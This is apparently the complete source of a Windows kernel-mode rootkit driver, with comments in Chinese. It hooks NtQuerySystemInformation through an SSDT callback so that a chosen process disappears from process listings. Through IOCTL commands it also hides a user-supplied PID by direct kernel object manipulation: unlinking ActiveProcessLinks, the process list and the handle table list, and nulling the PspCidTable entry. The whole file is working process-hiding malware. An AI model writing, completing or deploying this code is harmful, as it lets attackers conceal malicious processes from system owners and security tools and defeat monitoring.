#include "dkom.hpp"
#include "rootkit.hpp"

NTSTATUS MyNtQuerySystemInformation(
    IN ULONG SystemInformationClass,
    IN PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength)
{
    NTSTATUS rtStatus;

    rtStatus = g_NtQuerySystemInformation(SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength);
    if (NT_SUCCESS(rtStatus))
    {
        if (5 == SystemInformationClass)
        {
            PSYSTEM_PROCESSES pPrevProcessInfo = NULL;
            PSYSTEM_PROCESSES pCurrProcessInfo =
                (PSYSTEM_PROCESSES)SystemInformation;
            while (pCurrProcessInfo != NULL)
            {

                //获取当前遍历的 SYSTEM_PROCESSES 节点的进程名称和进程 ID
                ULONG uPID = (ULONG)pCurrProcessInfo->ProcessId ? pCurrProcessInfo->ProcessId : pCurrProcessInfo->InheritedFromProcessId;
                UNICODE_STRING name = pCurrProcessInfo->ProcessName;

                UNICODE_STRING UniProcessName, str;
                RtlInitUnicodeString(&UniProcessName, name.Buffer);
                RtlUpcaseUnicodeString(&str, &UniProcessName, TRUE);
                //判断当前遍历的这个进程是否为需要隐藏的进程
                DbgPrint("[MyNtQuerySystemInformation]:PID[%u]\n", uPID);
                DbgPrint("%S\n", name.Buffer);
                if (uPID == pid)
                {

                    if (pPrevProcessInfo)
                    {
                        if (pCurrProcessInfo->NextEntryDelta)
                        {
                            //更改链表指针
                            pPrevProcessInfo->NextEntryDelta += pCurrProcessInfo->NextEntryDelta;
                        }
                        else
                        {
                            //当前要隐藏的这个进程是进程链表中的最后一个
                            pPrevProcessInfo->NextEntryDelta = 0;
                        }
                    }
                    else
                    {
                        //第一个遍历到得进程就是需要隐藏的进程
                        if (pCurrProcessInfo->NextEntryDelta)
                        {
                            pCurrProcessInfo = (PSYSTEM_PROCESSES)
                                (((PCHAR)pCurrProcessInfo) + pCurrProcessInfo->NextEntryDelta);
                        }
                        else
                        {
                            pCurrProcessInfo = NULL;
                        }
                    }
                }

                pPrevProcessInfo = pCurrProcessInfo;

                if (pCurrProcessInfo->NextEntryDelta)
                {
                    pCurrProcessInfo = (PSYSTEM_PROCESSES)
                        (((PCHAR)pCurrProcessInfo) + pCurrProcessInfo->NextEntryDelta);
                }
                else
                {
                    pCurrProcessInfo = NULL;
                }
            }
        }
    }
    return rtStatus;
}

void __fastcall call_back(unsigned long ssdt_index, void** ssdt_address)
{
    UNREFERENCED_PARAMETER(ssdt_index);
    if (hook_on) {
        if (*ssdt_address == g_NtQuerySystemInformation) *ssdt_address = MyNtQuerySystemInformation;
    }
}

NTSTATUS MyDisPatcher(PDEVICE_OBJECT device_object,PIRP irp)
{       
         NTSTATUS status = STATUS_SUCCESS;
         ULONG inputBufferSize = 0;
         ULONG outputBufferSize = 0;
         ULONG functionCode = 0;
         _IOCTL_DATA *inputBuffer = 0;
         _IOCTL_DATA* outputBuffer = 0;
         PIO_STACK_LOCATION irp_stack = IoGetCurrentIrpStackLocation(irp);//取得 irp 資訊
         DbgPrint("enter MyDisPatcher\n");
         if (device_object != pMyDevice)
         {
            status = STATUS_UNSUCCESSFUL;
            return status;
         }
         switch(irp_stack->MajorFunction)
         {
         case IRP_MJ_DEVICE_CONTROL://透過 deviceIoControl() 傳過來 IOCTL 會進到入這裡
            DbgPrint("====== IRP_MJ_DEVICE_CONTROL ======\n");
            //Input buffer size
            inputBufferSize = irp_stack->Parameters.DeviceIoControl.InputBufferLength;
            //Output buffer size
            outputBufferSize = irp_stack->Parameters.DeviceIoControl.OutputBufferLength;
            //IOCTL code
            functionCode = irp_stack->Parameters.DeviceIoControl.IoControlCode;
            //input / output buffer
            inputBuffer  = (_IOCTL_DATA*)irp->AssociatedIrp.SystemBuffer;
            outputBuffer = (_IOCTL_DATA*)irp->AssociatedIrp.SystemBuffer;

            switch(functionCode)
            {
            case SET_PID:
                pid = inputBuffer->pid;
                PsLookupProcessByProcessId((HANDLE)inputBuffer->pid, &Eprocess);
                break;
            case UNLINK_ACTIVEPROCESSLINKS:
                if (Eprocess) {
                    UnlinkActiveProcessLists(Eprocess);
                }
                break;
            case UNLINK_PROCESSLISTENTRY:
                if (Eprocess) {
                    UnlinkProcessListEntry(Eprocess);
                }
                break;
            case UNLINK_HANDLETABLELIST:
                if (Eprocess) {
                    UnlinkHandleTableList(Eprocess);
                }
                break;
            case NULL_PSPCIDTABLE:
                if (pid != -1) {
                    NullPspCidTable(pid);
                }
                break;
            case ALL_DKOM:
                if (Eprocess && pid != -1) {
                    UnlinkActiveProcessLists(Eprocess);
                    UnlinkProcessListEntry(Eprocess);
                    UnlinkHandleTableList(Eprocess);
                    NullPspCidTable(pid);
                }
                break;
            case INFINITY_HOOK_ON:
                hook_on = TRUE;
                break;
            case INFINITY_HOOK_OFF:
                hook_on = FALSE;
                break;
            default:
                break;
            }
            break;
         case IRP_MJ_CREATE://CreateFile
                DbgPrint("===== IRP_MJ_CREATE ======\n");
                break;
         case IRP_MJ_CLOSE://CloseHandle
                DbgPrint("===== IRP_MJ_CLOSE ======\n");
                break;
         case IRP_MJ_READ://ReadFile
                break;
         case IRP_MJ_WRITE://WriteFile
                break;
         default:
                break;
         }
         irp->IoStatus.Status = STATUS_SUCCESS;
         irp->IoStatus.Information = outputBufferSize;//實際要複製給 usermode 的 bytes 長度.
         IoCompleteRequest(irp,IO_NO_INCREMENT);//指示完成 IRP 操作
         return status;
}


NTSTATUS MyCreateDevice(PDRIVER_OBJECT driver_object)
{
    NTSTATUS status;
    RtlInitUnicodeString(&DeviceName,device_name);
    RtlInitUnicodeString(&SymLinkName,symlink_name);
    status = IoCreateDevice(driver_object,0,&DeviceName,FILE_DEVICE_UNKNOWN,0,1,&pMyDevice);
    if (NT_SUCCESS(status))
    {       
        driver_object->DeviceObject= pMyDevice;
        DbgPrint("CreateDevice Success！\n");
        status = IoCreateSymbolicLink(&SymLinkName, &DeviceName);
        if(NT_SUCCESS(status))
        {
            DbgPrint("Create Symbol Success！\n");
            return status;
        }
    }
    return status;
}

void  DriverUnload(PDRIVER_OBJECT db)
{
    UNREFERENCED_PARAMETER(db);
    k_hook::stop();
    IoDeleteSymbolicLink(&SymLinkName);//移除 sysbol name
    IoDeleteDevice(db->DeviceObject);//移除 device
}

EXTERN_C NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object, PUNICODE_STRING RegistryPath )
{
    UNREFERENCED_PARAMETER( RegistryPath );
    DbgPrint("Enter DriverEntry！\n");
    NTSTATUS status = STATUS_SUCCESS;
    driver_object->DriverUnload = DriverUnload;
    status = MyCreateDevice(driver_object);

    driver_object->MajorFunction[IRP_MJ_CREATE]         = MyDisPatcher;
    driver_object->MajorFunction[IRP_MJ_CLOSE]          = MyDisPatcher;
    driver_object->MajorFunction[IRP_MJ_READ]           = MyDisPatcher;
    driver_object->MajorFunction[IRP_MJ_WRITE]          = MyDisPatcher;
    driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDisPatcher;

    UNICODE_STRING str;
    WCHAR name[256]{ L"NtQuerySystemInformation" };
    RtlInitUnicodeString(&str, name);
    g_NtQuerySystemInformation = (FNtQuerySystemInformation)MmGetSystemRoutineAddress(&str);

    return k_hook::initialize(call_back) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}